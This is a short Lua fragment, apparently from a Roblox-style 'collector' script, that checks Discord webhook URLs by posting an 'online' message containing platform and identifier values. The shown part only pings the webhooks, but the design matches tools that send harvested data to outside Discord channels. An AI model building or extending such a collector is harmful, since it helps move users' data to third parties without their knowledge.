local healthCache = {}
local function checkWebhook(url, label)
    if type(url) ~= "string" or not url:find("^https://discord%.com/api/webhooks/") then
        log("webhook."..label, "[FAIL] malformed"); return false
    end
    if healthCache[url] ~= nil then log("webhook."..label, "[cached] "..tostring(healthCache[url])); return healthCache[url] end
    local ok = hit({ Url=url, Method="POST", Headers={["Content-Type"]="application/json"},
        Body=encode({ content="`[collector]` **"..label.."** online · "..PLATFORM.." · "..IDENT }) })
    healthCache[url] = ok
    log("webhook."..label, ok and "[ok]" or "[FAIL]")
    return ok
end

